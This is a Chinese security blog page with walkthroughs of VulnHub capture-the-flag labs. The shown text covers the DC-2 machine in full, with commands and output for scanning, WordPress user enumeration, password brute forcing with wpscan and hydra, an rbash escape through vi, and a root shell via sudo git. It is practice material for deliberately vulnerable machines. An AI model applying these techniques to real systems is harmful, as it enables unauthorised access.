<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta http-equiv=Content-Security-Policy content="upgrade-insecure-requests"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>VulnHub 靶场 | w8nn9z Blog</title><meta name=keywords content><meta name=description content="VulnHub 靶场 - w8nn9z Blog"><meta name=author content><link rel=canonical href=https://blog.w8nn9z.top/posts/pentest/vulnhub/><link crossorigin=anonymous href=/assets/css/stylesheet.12a5629d0be5f885fd946d77257e55f74027ed2a35144a29e2db13f8f62b5f35.css integrity rel="preload stylesheet" as=style><link rel=icon href=https://blog.w8nn9z.top/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://blog.w8nn9z.top/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://blog.w8nn9z.top/favicon-32x32.png><link rel=apple-touch-icon href=https://blog.w8nn9z.top/apple-touch-icon.png><link rel=mask-icon href=https://blog.w8nn9z.top/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://blog.w8nn9z.top/posts/pentest/vulnhub/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://blog.w8nn9z.top/posts/pentest/vulnhub/"><meta property="og:site_name" content="w8nn9z Blog"><meta property="og:title" content="VulnHub 靶场"><meta property="og:locale" content="zh-cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2025-09-25T00:00:00+00:00"><meta property="article:modified_time" content="2025-12-09T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="VulnHub 靶场"><meta name=twitter:description content><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://blog.w8nn9z.top/posts/"},{"@type":"ListItem","position":2,"name":"PENTEST","item":"https://blog.w8nn9z.top/posts/pentest/"},{"@type":"ListItem","position":3,"name":"VulnHub 靶场","item":"https://blog.w8nn9z.top/posts/pentest/vulnhub/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"VulnHub 靶场","name":"VulnHub 靶场","description":"","keywords":[],"articleBody":"vulnhub DC2 nmap扫描开放端口及服务：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.135 Host is up (0.00060s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http 访问发现有域名解析不成功的问题，windows上可以修改C:\\Windows\\System32\\drivers\\etc\\hosts来配置域名解析，linux则是/etc/hosts：\n61.139.2.135 dc-2 访问web服务：\n访问：http://dc-2/index.php/flag/获取Flag1：\nFlag 1:\rYour usual wordlists probably won’t work, so instead, maybe you just need to be cewl.\rMore passwords is always better, but sometimes you just can’t win them all.\rLog in as one to see the next flag.\rIf you can’t find it, log in as another. 提示使用cewl来获取密码字典，从特定URL爬取关键字列表：\n$ cewl http://dc-2/ -w passwords.txt 由于网站是wordpress框架，利用wpscan枚举网站登录用户名：\nwpscan --url http://dc-2/ -e u #枚举用户名 [i] User(s) Identified: [+] admin | Found By: Rss Generator (Passive Detection) | Confirmed By: | Wp Json Api (Aggressive Detection) | - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100\u0026page=1 | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] jerry | Found By: Wp Json Api (Aggressive Detection) | - http://dc-2/index.php/wp-json/wp/v2/users/?per_page=100\u0026page=1 | Confirmed By: | Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Login Error Messages (Aggressive Detection) [+] tom | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection) | Confirmed By: Login Error Messages (Aggressive Detection) 再用wpscan爆破用户名和密码进行登录：\nwpscan --url http://dc-2/ -U username.txt -P passwords.txt [+] Performing password attack on Xmlrpc against 3 user/s [SUCCESS] - jerry / adipiscing [SUCCESS] - tom / parturient 访问wordpress登录界面wp-admin进行登录，跳转到了wp-login，Pages里找到Flag2：\nFlag 2:\rIf you can't exploit WordPress and take a shortcut, there is another way.\rHope you found another entry point. 可能存在其他服务，再用nmap对该ip进行全面扫描：\n$ nmap -A -p 1-65535 61.139.2.135 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-25 12:41 CST Nmap scan report for dc-2 (61.139.2.135) Host is up (0.00036s latency). Not shown: 65533 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.10 ((Debian)) |_http-generator: WordPress 4.7.10 |_http-server-header: Apache/2.4.10 (Debian) |_http-title: DC-2 \u0026#8211; Just another WordPress site 7744/tcp open ssh OpenSSH 6.7p1 Debian 5+deb8u7 (protocol 2.0) | ssh-hostkey: | 1024 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 (DSA) | 2048 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 (RSA) | 256 df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 (ECDSA) |_ 256 d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 (ED25519) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds 可以发现7744端口开启了ssh服务，指定端口爆破之前的用户名和密码：\n$ hydra -L username.txt -P passwords.txt ssh://61.139.2.135 -vV -s 7744 [7744][ssh] host: 61.139.2.135 login: tom password: parturient ssh登录后发现是rbash，限制了很多命令如cd，先用less查看flag3.txt：\nPoor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes. 再看一下PATH环境变量允许执行哪些命令：\ntom@DC-2:~$ echo $PATH /home/tom/usr/bin tom@DC-2:~$ ls /home/tom/usr/bin less ls scp vi 利用vi进行rbash逃逸：\n:set shell=/bin/bash\r:shell /etc/passwd：\ntom@DC-2:~$ /bin/cat /etc/passw /bin/cat: /etc/passw: No such file or directory tom@DC-2:~$ /bin/cat /etc/passwd root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false Debian-exim:x:104:109::/var/spool/exim4:/bin/false messagebus:x:105:110::/var/run/dbus:/bin/false statd:x:106:65534::/var/lib/nfs:/bin/false sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false tom:x:1001:1001:Tom Cat,,,:/home/tom:/bin/rbash jerry:x:1002:1002:Jerry Mouse,,,:/home/jerry:/bin/bash 尝试su登录Jerry账户，使用之前wordpress的密码登录成功，发现flag4.txt：\njerry@DC-2:~$ cat flag4.txt Good to see that you've made it this far - but you're not home yet. You still need to get the final flag (the only flag that really counts!!!). No hints here - you're on your own now. :-) Go on - git outta here!!!! find没有找到suid权限文件，尝试sudo -l：\njerry@DC-2:~$ sudo -l Matching Defaults entries for jerry on DC-2: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin User jerry may run the following commands on DC-2: (root) NOPASSWD: /usr/bin/git git提权：\nsudo git help config 在命令模式的末行输入!/bin/bash或!'sh' final-flag.txt：\n# cat /root/final-flag.txt\r__ __ _ _ _ _ / / /\\ \\ \\___| | | __| | ___ _ __ ___ / \\\r\\ \\/ \\/ / _ \\ | | / _` |/ _ \\| '_ \\ / _ \\/ /\r\\ /\\ / __/ | | | (_| | (_) | | | | __/\\_/ \\/ \\/ \\___|_|_| \\__,_|\\___/|_| |_|\\___\\/ Congratulatons!!!\rA special thanks to all those who sent me tweets\rand provided me with feedback - it's all greatly\rappreciated.\rIf you enjoyed this CTF, send me a tweet via @DCAU7. 参考资料：\nhttps://www.ddosi.org/cewl/\nhttps://www.freebuf.com/vuls/376922.html\nvulnhub DC3 nmap扫描开放端口及服务：\n$ nmap 61.139.2.0/24 Nmap scan report for 61.139.2.136 Host is up (0.00096s latency). Not shown: 999 closed tcp ports (conn-refused) PORT STATE SERVICE 80/tcp open http 全面扫描：\n$ nmap -A -p 1-65535 61.139.2.136 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-09-26 10:39 CST Nmap scan report for 61.139.2.136 Host is up (0.00096s latency). Not shown: 65534 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 80/tcp open http Apache httpd 2.4.18 ((Ubuntu)) |_http-generator: Joomla! - Open Source Content Management |_http-title: Home |_http-server-header: Apache/2.4.18 (Ubuntu) 访问web服务：\n获取版本信息/administrator/manifests/files/joomla.xml：\n","wordCount":"13972","inLanguage":"en","datePublished":"2025-09-25T00:00:00Z","dateModified":"2025-12-09T00:00:00Z","mainEntityOfPage":{"@type":"WebPage","@id":"https://blog.w8nn9z.top/posts/pentest/vulnhub/"},"publisher":{"@type":"Organization","name":"w8nn9z Blog","logo":{"@type":"ImageObject","url":"https://blog.w8nn9z.top/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://blog.w8nn9z.top/ accesskey=h title="w8nn9z Blog (Alt + H)">w8nn9z Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://blog.w8nn9z.top/search title="搜索 (Alt + /)" accesskey=/><span>搜索</span></a></li><li><a href=https://blog.w8nn9z.top/posts title=文章><span>文章</span></a></li><li><a href=https://blog.w8nn9z.top/archives title=归档><span>归档</span></a></li><li><a href=https://blog.w8nn9z.top/about title=关于><span>关于</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">VulnHub 靶场</h1><div class=post-meta><span title='2025-09-25 00:00:00 +0000 UTC'>September 25, 2025</span></div></header><aside id=toc-container class="toc-container wide"><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#vulnhub-dc2 aria-label="vulnhub DC2">vulnhub DC2</a></li><li><a href=#vulnhub-dc3 aria-label="vulnhub DC3">vulnhub DC3</a></li><li><a href=#vulnhub-dc4 aria-label="vulnhub DC4">vulnhub DC4</a></li><li><a href=#vulnhub-dc5 aria-label="vulnhub DC5">vulnhub DC5</a></li><li><a href=#vulnhub-dc6 aria-label="vulnhub DC6">vulnhub DC6</a></li><li><a href=#vulnhub-dc7 aria-label="vulnhub DC7">vulnhub DC7</a></li><li><a href=#vulnhub-dc8 aria-label="vulnhub DC8">vulnhub DC8</a></li><li><a href=#vulnhub-dc9 aria-label="vulnhub DC9">vulnhub DC9</a></li><li><a href=#vulnhub-ica1 aria-label="vulnhub ICA1">vulnhub ICA1</a></li><li><a href=#vulnhub-vulnearbledocker aria-label="vulnhub VulnearbleDocker">vulnhub VulnearbleDocker</a></li><li><a href=#vulnhub-tomato aria-label="vulnhub Tomato">vulnhub Tomato</a></li><li><a href=#vulnhub-momentum aria-label="vulnhub Momentum">vulnhub Momentum</a></li></ul></div></details></div></aside><script>let activeElement,elements;document.addEventListener("DOMContentLoaded",function(){if(checkTocPosition(),elements=document.querySelectorAll("h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]"),elements.length>0){activeElement=elements[0];const e=encodeURI(activeElement.getAttribute("id")).toLowerCase();document.querySelector(`.inner ul li a[href="#${e}"]`).classList.add("active")}const t=document.getElementById("top-link");t&&t.addEventListener("click",e=>{e.preventDefault(),window.scrollTo({top:0,behavior:"smooth"})})},!1),window.addEventListener("resize",function(){checkTocPosition()},!1),window.addEventListener("scroll",()=>{const e=window.pageYOffset||document.documentElement.scrollTop;if(e===0)return;elements&&elements.length>0&&(activeElement=Array.from(elements).find(t=>{if(getOffsetTop(t)-e>0&&getOffsetTop(t)-e<window.innerHeight/2)return t})||activeElement,elements.forEach(e=>{const n=encodeURI(e.getAttribute("id")).toLowerCase(),t=document.querySelector(`.inner ul li a[href="#${n}"]`);if(e===activeElement){t.classList.add("active");const e=document.querySelector(".toc .inner"),n=t.offsetTop,s=e.clientHeight,o=t.clientHeight,i=n-s/2+o/2;e.scrollTo({top:i,behavior:"smooth"})}else t.classList.remove("active")}))},!1);const main=parseInt(getComputedStyle(document.body).getPropertyValue("--article-width"),10),toc=parseInt(getComputedStyle(document.body).getPropertyValue("--toc-width"),10),gap=parseInt(getComputedStyle(document.body).getPropertyValue("--gap"),10);function checkTocPosition(){const e=document.body.scrollWidth;e-main-toc*2-gap*4>0?document.getElementById("toc-container").classList.add("wide"):document.getElementById("toc-container").classList.remove("wide")}function getOffsetTop(e){if(!e.getClientRects().length)return 0;let t=e.getBoundingClientRect(),n=e.ownerDocument.defaultView;return t.top+n.pageYOffset}</script><div class=post-content><h2 id=vulnhub-dc2>vulnhub DC2<a hidden class=anchor aria-hidden=true href=#vulnhub-dc2>#</a></h2><p>nmap扫描开放端口及服务：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nmap 61.139.2.0/24
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> 61.139.2.135
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00060s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>999</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE
</span></span><span style=display:flex><span>80/tcp open  http
</span></span></code></pre></div><p>访问发现有域名解析不成功的问题，windows上可以修改<code>C:\Windows\System32\drivers\etc\hosts</code>来配置域名解析，linux则是<code>/etc/hosts</code>：</p><pre tabindex=0><code>61.139.2.135 dc-2
</code></pre><p>访问web服务：</p><p><img alt=alt loading=lazy src=/images/vulnhub/3.png></p><p>访问：<code>http://dc-2/index.php/flag/</code>获取Flag1：</p><pre tabindex=0><code>Flag 1:

Your usual wordlists probably won’t work, so instead, maybe you just need to be cewl.

More passwords is always better, but sometimes you just can’t win them all.

Log in as one to see the next flag.

If you can’t find it, log in as another.
</code></pre><p>提示使用cewl来获取密码字典，从特定URL爬取关键字列表：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ cewl http://dc-2/ -w passwords.txt
</span></span></code></pre></div><p>由于网站是wordpress框架，利用wpscan枚举网站登录用户名：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>wpscan --url http://dc-2/ -e u <span style=color:#75715e>#枚举用户名</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>i<span style=color:#f92672>]</span> User<span style=color:#f92672>(</span>s<span style=color:#f92672>)</span> Identified:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> admin
</span></span><span style=display:flex><span> | Found By: Rss Generator <span style=color:#f92672>(</span>Passive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> | Confirmed By:
</span></span><span style=display:flex><span> |  Wp Json Api <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |   - http://dc-2/index.php/wp-json/wp/v2/users/?per_page<span style=color:#f92672>=</span>100&amp;page<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> |  Author Id Brute Forcing - Author Pattern <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |  Login Error Messages <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> jerry
</span></span><span style=display:flex><span> | Found By: Wp Json Api <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |  - http://dc-2/index.php/wp-json/wp/v2/users/?per_page<span style=color:#f92672>=</span>100&amp;page<span style=color:#f92672>=</span><span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> | Confirmed By:
</span></span><span style=display:flex><span> |  Author Id Brute Forcing - Author Pattern <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> |  Login Error Messages <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> tom
</span></span><span style=display:flex><span> | Found By: Author Id Brute Forcing - Author Pattern <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span> | Confirmed By: Login Error Messages <span style=color:#f92672>(</span>Aggressive Detection<span style=color:#f92672>)</span>
</span></span></code></pre></div><p>再用wpscan爆破用户名和密码进行登录：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>wpscan --url http://dc-2/ -U username.txt -P passwords.txt
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>+<span style=color:#f92672>]</span> Performing password attack on Xmlrpc against <span style=color:#ae81ff>3</span> user/s
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> - jerry / adipiscing
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>SUCCESS<span style=color:#f92672>]</span> - tom / parturient
</span></span></code></pre></div><p>访问wordpress登录界面wp-admin进行登录，跳转到了wp-login，Pages里找到Flag2：</p><pre tabindex=0><code>Flag 2:

If you can&#39;t exploit WordPress and take a shortcut, there is another way.

Hope you found another entry point.
</code></pre><p>可能存在其他服务，再用nmap对该ip进行全面扫描：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ nmap -A -p 1-65535 61.139.2.135
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#f92672>(</span> https://nmap.org <span style=color:#f92672>)</span> at 2025-09-25 12:41 CST
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#66d9ef>for</span> dc-2 <span style=color:#f92672>(</span>61.139.2.135<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Host is up <span style=color:#f92672>(</span>0.00036s latency<span style=color:#f92672>)</span>.
</span></span><span style=display:flex><span>Not shown: <span style=color:#ae81ff>65533</span> closed tcp ports <span style=color:#f92672>(</span>conn-refused<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>PORT     STATE SERVICE VERSION
</span></span><span style=display:flex><span>80/tcp   open  http    Apache httpd 2.4.10 <span style=color:#f92672>((</span>Debian<span style=color:#f92672>))</span>
</span></span><span style=display:flex><span>|_http-generator: WordPress 4.7.10
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.10 <span style=color:#f92672>(</span>Debian<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_http-title: DC-2 &amp;<span style=color:#75715e>#8211; Just another WordPress site</span>
</span></span><span style=display:flex><span>7744/tcp open  ssh     OpenSSH 6.7p1 Debian 5+deb8u7 <span style=color:#f92672>(</span>protocol 2.0<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>| ssh-hostkey: 
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>1024</span> 52:51:7b:6e:70:a4:33:7a:d2:4b:e1:0b:5a:0f:9e:d7 <span style=color:#f92672>(</span>DSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>2048</span> 59:11:d8:af:38:51:8f:41:a7:44:b3:28:03:80:99:42 <span style=color:#f92672>(</span>RSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|   <span style=color:#ae81ff>256</span> df:18:1d:74:26:ce:c1:4f:6f:2f:c1:26:54:31:51:91 <span style=color:#f92672>(</span>ECDSA<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>|_  <span style=color:#ae81ff>256</span> d9:38:5f:99:7c:0d:64:7e:1d:46:f6:e9:7c:c6:37:17 <span style=color:#f92672>(</span>ED25519<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#66d9ef>done</span>: <span style=color:#ae81ff>1</span> IP address <span style=color:#f92672>(</span><span style=color:#ae81ff>1</span> host up<span style=color:#f92672>)</span> scanned in 9.85 seconds
</span></span></code></pre></div><p>可以发现7744端口开启了ssh服务，指定端口爆破之前的用户名和密码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>$ hydra -L username.txt -P passwords.txt ssh://61.139.2.135 -vV -s <span style=color:#ae81ff>7744</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>[</span>7744<span style=color:#f92672>][</span>ssh<span style=color:#f92672>]</span> host: 61.139.2.135   login: tom   password: parturient
</span></span></code></pre></div><p>ssh登录后发现是rbash，限制了很多命令如<code>cd</code>，先用<code>less</code>查看<code>flag3.txt</code>：</p><pre tabindex=0><code>Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
</code></pre><p>再看一下PATH环境变量允许执行哪些命令：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>tom@DC-2:~$ echo $PATH
</span></span><span style=display:flex><span>/home/tom/usr/bin
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>tom@DC-2:~$ ls /home/tom/usr/bin
</span></span><span style=display:flex><span>less  ls  scp  vi
</span></span></code></pre></div><p>利用vi进行rbash逃逸：</p><pre tabindex=0><code>:set shell=/bin/bash
:shell
</code></pre><p><code>/etc/passwd</code>：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>tom@DC-2:~$ /bin/cat /etc/passw
</span></span><span style=display:flex><span>/bin/cat: /etc/passw: No such file or directory
</span></span><span style=display:flex><span>tom@DC-2:~$ /bin/cat /etc/passwd
</span></span><span style=display:flex><span>root:x:0:0:root:/root:/bin/bash
</span></span><span style=display:flex><span>daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
</span></span><span style=display:flex><span>bin:x:2:2:bin:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>sys:x:3:3:sys:/dev:/usr/sbin/nologin
</span></span><span style=display:flex><span>sync:x:4:65534:sync:/bin:/bin/sync
</span></span><span style=display:flex><span>games:x:5:60:games:/usr/games:/usr/sbin/nologin
</span></span><span style=display:flex><span>man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
</span></span><span style=display:flex><span>lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
</span></span><span style=display:flex><span>news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
</span></span><span style=display:flex><span>uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
</span></span><span style=display:flex><span>proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
</span></span><span style=display:flex><span>www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
</span></span><span style=display:flex><span>backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
</span></span><span style=display:flex><span>list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
</span></span><span style=display:flex><span>irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
</span></span><span style=display:flex><span>gnats:x:41:41:Gnats Bug-Reporting System <span style=color:#f92672>(</span>admin<span style=color:#f92672>)</span>:/var/lib/gnats:/usr/sbin/nologin
</span></span><span style=display:flex><span>nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
</span></span><span style=display:flex><span>systemd-timesync:x:100:103:systemd Time Synchronization,,,:/run/systemd:/bin/false
</span></span><span style=display:flex><span>systemd-network:x:101:104:systemd Network Management,,,:/run/systemd/netif:/bin/false
</span></span><span style=display:flex><span>systemd-resolve:x:102:105:systemd Resolver,,,:/run/systemd/resolve:/bin/false
</span></span><span style=display:flex><span>systemd-bus-proxy:x:103:106:systemd Bus Proxy,,,:/run/systemd:/bin/false
</span></span><span style=display:flex><span>Debian-exim:x:104:109::/var/spool/exim4:/bin/false
</span></span><span style=display:flex><span>messagebus:x:105:110::/var/run/dbus:/bin/false
</span></span><span style=display:flex><span>statd:x:106:65534::/var/lib/nfs:/bin/false
</span></span><span style=display:flex><span>sshd:x:107:65534::/var/run/sshd:/usr/sbin/nologin
</span></span><span style=display:flex><span>mysql:x:108:114:MySQL Server,,,:/nonexistent:/bin/false
</span></span><span style=display:flex><span>tom:x:1001:1001:Tom Cat,,,:/home/tom:/bin/rbash
</span></span><span style=display:flex><span>jerry:x:1002:1002:Jerry Mouse,,,:/home/jerry:/bin/bash
</span></span></code></pre></div><p>尝试su登录Jerry账户，使用之前wordpress的密码登录成功，发现flag4.txt：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>jerry@DC-2:~$ cat flag4.txt
</span></span><span style=display:flex><span>Good to see that you<span style=color:#e6db74>&#39;ve made it this far - but you&#39;</span>re not home yet. 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>You still need to get the final flag <span style=color:#f92672>(</span>the only flag that really counts!!!<span style=color:#f92672>)</span>.  
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>No hints here - you<span style=color:#960050;background-color:#1e0010>&#39;</span>re on your own now.  :-<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Go on - git outta here!!!!
